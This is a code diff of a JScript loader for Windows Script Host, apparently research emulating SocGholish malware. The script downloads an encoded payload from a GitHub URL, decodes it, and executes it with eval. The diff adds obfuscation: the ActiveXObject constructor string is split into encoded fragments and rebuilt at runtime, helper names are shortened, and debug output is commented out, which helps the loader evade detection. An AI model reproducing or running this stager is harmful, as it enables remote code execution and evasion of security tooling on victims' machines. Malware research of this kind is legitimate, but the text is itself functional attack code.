@@ -1,4 +1,4 @@
-function customBase64Decode(inputStr) {
+function decode(inputStr) {
     var base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
     var result = '';
     var charCount = 0;
@@ -35,7 +35,7 @@ function customBase64Decode(inputStr) {
     return result;
 }
 
-function simpleDecrypt(inputStr, cycles) {
+function decrypt(inputStr, cycles) {
     var result = inputStr;
     var cycle, i, cycleKey, tempResult, decryptedChar;
 
@@ -51,8 +51,24 @@ function simpleDecrypt(inputStr, cycles) {
     return result;
 }
 
+var mapping = {
+    _0x1111:"UXNkeWZ1SA==", // ActiveX
+    _0x2222:"X3J6dXNkODI=", // Object("
+    _0x3333:"XUNIXVwiPkg=", // MSXML2.X
+    _0x4444:"XVxYRERAMjk=", // MLHTTP")
+    _0x5555:"fnVnMA=="      // new 
+}
+
 // Create an instance of the MSXML2.XMLHTTP object
-var XmlHttp_Object = new ActiveXObject("MSXML2.XMLHTTP");
+// var XmlHttp_Object = new ActiveXObject("MSXML2.XMLHTTP");
+var _a0x7821 = decrypt(decode(mapping._0x1111), 4) + decrypt(decode(mapping._0x2222), 4)
++ decrypt(decode(mapping._0x3333), 4) + decrypt(decode(mapping._0x4444), 4);
+var _a0x2346 = decrypt(decode(mapping._0x5555), 4) + _a0x7821; 
+
+
+var XmlHttp_Object = eval(_a0x2346);
+
+// WScript.Echo(_a0x7821);
 
 // URL of the JavaScript file on GitHub
 var githubFileUrl = "https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/encoded-payload.txt";
@@ -76,11 +92,7 @@ if (XmlHttp_Object.status === 200) {
     console.error("Error fetching file: HTTP status " + XmlHttp_Object.status);
 }
 
-var payload = simpleDecrypt(customBase64Decode(fileContent), 4);
-WScript.Echo(fileContent);
-WScript.Echo(payload);
+var payload = decrypt(decode(fileContent), 4);
+// WScript.Echo(fileContent);
+// WScript.Echo(payload);
 this[eval(payload)];
-// Usage example
-var encryptedBase64 = "ZnFiMGN4dXx8MC0wfnVnMFFzZHlmdUhfcnp1c2Q4MkdDc2J5YGQ+Q3h1fHwyOSswZnFiMHN/fX1xfnQwLTAyc310PnVodTA/UzB+dWQwZWN1YjIrMGN4dXx8PkJlfjhzf319cX50OSs=";
-var decrypted = simpleDecrypt(customBase64Decode(encryptedBase64), 4);
-//WScript.Echo("Decrypted:", decrypted);
